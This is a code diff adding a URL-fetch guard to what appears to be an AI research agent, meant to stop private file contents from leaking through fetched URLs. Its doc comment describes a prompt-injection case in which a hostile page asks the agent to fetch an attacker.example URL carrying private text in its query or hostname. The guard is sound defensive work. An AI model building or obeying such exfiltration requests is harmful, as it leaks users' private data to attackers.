@@ -36,6 +36,8 @@
  * what was offered but never switch on something that was not.
  */
 
+import { canonicalUrl } from "@/lib/search/url-safety";
+
 /** The kinds of private source a run can read. Additive: new kinds go on the end. */
 export const PRIVATE_SOURCE_KINDS = [
   /** Files attached to this conversation. */
@@ -395,6 +397,80 @@ export function sanitiseWebQuery(query: string, fingerprint: PrivateFingerprint 
   if (!changed) return { query: kept || query, changed: false };
   if (meaningful < MIN_QUERY_WORDS) return { query: null, changed: true };
   return { query: kept, changed };
+}
+
+/** A path segment or host label long enough, in a token alphabet, to be an encoded payload. */
+const OPAQUE_SEGMENT = /^[A-Za-z0-9+/=_-]{24,}$/;
+/**
+ * A slug piece people write: a lowercase word, a short number, or a short
+ * mixed token (v2, h264). Mixed case, long hex and long mixed runs are what
+ * an encoder produces, and `observability-pricing-guide` is not one of them.
+ */
+const SLUG_PIECE = /^(?:[a-z]{1,20}|\d{1,8}|[a-z0-9]{1,6})$/;
+
+function isOpaque(part: string): boolean {
+  if (!OPAQUE_SEGMENT.test(part)) return false;
+  return !part.split(/[-_]/).every((piece) => SLUG_PIECE.test(piece));
+}
+const MAX_OPEN_SEGMENTS = 6;
+const MAX_OPEN_SEGMENT_CHARS = 48;
+
+export interface OpenUrlGuardContext {
+  /** Whether the URL is already a source row of this run (every search hit is stored at search time). */
+  known: boolean;
+  /** The plan's pinned sources, as canonical URLs. */
+  pinned: ReadonlySet<string>;
+  fingerprint: PrivateFingerprint | null;
+}
+
+export type OpenUrlVerdict = { ok: true } | { ok: false; reason: "query" | "shape" | "opaque" | "private_words" | "invalid" };
+
+/**
+ * Whether a researcher may fetch a URL while the run reads the person's own
+ * sources (DR-01).
+ *
+ * `sanitiseWebQuery` keeps private text out of search queries, but a URL is
+ * a message too: the fetch alone delivers `https://attacker.example/c?d=<text
+ * from a private file>` to whoever owns the host, and a prompt-injected page
+ * or document can ask for exactly that. So a URL is fetched only when the run
+ * already found it (a search hit, a link on a fetched public page), the
+ * person pinned it, or it is plainly a public address: no query string, a
+ * short path of short words, nothing that looks encoded, and no host or path
+ * word the private sources contain. Host labels are checked like path
+ * segments because resolving `nightjar-4812330.attacker.example` leaks the
+ * same way a path does.
+ */
+export function privateSafeOpenUrl(url: string, ctx: OpenUrlGuardContext): OpenUrlVerdict {
+  if (ctx.known) return { ok: true };
+  let parsed: URL;
+  try {
+    parsed = new URL(url);
+  } catch {
+    return { ok: false, reason: "invalid" };
+  }
+  if (ctx.pinned.has(canonicalUrl(url))) return { ok: true };
+  if (parsed.search || parsed.username || parsed.password) return { ok: false, reason: "query" };
+  const segments: string[] = [];
+  for (const raw of parsed.pathname.split("/").filter(Boolean)) {
+    try {
+      segments.push(decodeURIComponent(raw));
+    } catch {
+      return { ok: false, reason: "invalid" };
+    }
+  }
+  if (segments.length > MAX_OPEN_SEGMENTS || segments.some((segment) => segment.length > MAX_OPEN_SEGMENT_CHARS)) {
+    return { ok: false, reason: "shape" };
+  }
+  const labels = parsed.hostname.split(".").filter(Boolean);
+  if ([...labels, ...segments].some(isOpaque)) return { ok: false, reason: "opaque" };
+  // Joined with commas, not spaces: `LONG_NUMBER` spans spaces, and a dated
+  // path (/2026/10/31/) would otherwise read as one private-looking number.
+  const text = [...labels, ...segments]
+    .flatMap((part) => part.split(/[^\p{L}\p{N}]+/u))
+    .filter(Boolean)
+    .join(", ");
+  if (sanitiseWebQuery(text, ctx.fingerprint).changed) return { ok: false, reason: "private_words" };
+  return { ok: true };
 }
 
 // ---------------------------------------------------------------------------
